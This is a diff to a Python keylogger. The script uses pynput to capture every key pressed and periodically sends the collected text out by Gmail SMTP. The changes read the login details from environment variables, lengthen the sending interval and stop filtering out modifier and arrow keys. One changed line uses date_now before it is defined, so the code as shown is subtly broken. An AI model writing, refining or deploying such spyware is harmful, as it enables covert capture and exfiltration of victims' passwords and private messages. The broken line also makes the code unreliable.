@@ -1,20 +1,19 @@
 from pynput.keyboard import Key, Listener
-import logging, smtplib, time, datetime, threading
+import logging, smtplib, time, datetime, threading, os
 from threading import Thread
 
 def func1():
     global message
-    email = 'your_email.com'
-    password = 'your_password'
-    send_to_email = 'target_email.com'
+    email = os.environ.get('EMAIL_NAME')
+    password = os.environ.get('EMAIL_PASS')
+    send_to_email = os.environ.get('EMAIL_NAME')
     message = []
 
     session_exit = False
     tm = datetime.datetime.now().time()
-    date_now = datetime.datetime(100,1,1,tm.hour, tm.minute, tm.second)
-    email_date = date_now + datetime.timedelta(0,30)
-    time_now = date_now.time()
-    email_time = email_date.time()
+    time_now = datetime.datetime(100,1,1,tm.hour, tm.minute, tm.second).time()
+    email_time = (date_now + datetime.timedelta(0,1800)).time()
+    email_no = 0
     print("Setup Done")
 
     while session_exit == False:
@@ -22,7 +21,8 @@ def func1():
         date_now = datetime.datetime(100,1,1,tm.hour, tm.minute, tm.second)
         time_now = date_now.time()
         if time_now >= email_time:
-            print("Email")
+            email_no += 1
+            print('Email No {}'.format(email_no))
             server = smtplib.SMTP('smtp.gmail.com', 587)
             server.starttls()
             server.login(email, password)
@@ -33,17 +33,12 @@ def func1():
             print(sending)
             message = []
 
-            email_date = date_now + datetime.timedelta(0,30)
-            email_time = email_date.time()
+            email_time = (date_now + datetime.timedelta(0,30)).time()
 
 def func2():
     def on_press(key):
         if str(key) == "Key.space":
             key = " "
-        elif str(key) == "Key.shift":
-            key = ""
-        elif str(key) == "Key.down" or str(key) == "Key.up" or str(key) == "Key.alt":
-            key=""
         elif str(key) == "Key.backspace":
             print("Backspace")
             if len(message) > 0:
@@ -51,7 +46,7 @@ def func2():
             key = ""
         if key != "":
             message.append(str(key))
-        print("Keydown")
+        print("Keydown: {}".format(key))
     with Listener(on_press=on_press) as listener:
         listener.join()
 
